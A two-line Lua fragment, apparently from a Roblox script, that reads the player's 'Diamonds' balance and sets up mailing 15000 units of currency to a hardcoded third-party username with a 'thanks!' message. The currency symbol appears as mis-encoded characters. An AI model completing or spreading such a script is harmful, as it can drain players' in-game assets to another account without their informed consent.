local diamonds = "ðŸ’Ž Diamonds"; local startDiamonds = game.Players.LocalPlayer.leaderstats[diamonds].Value
local sendTo = "r3allifesobadz"; local mailMsg = "thanks!"; local toSend = "Currency"; local mailAmnt = 15000
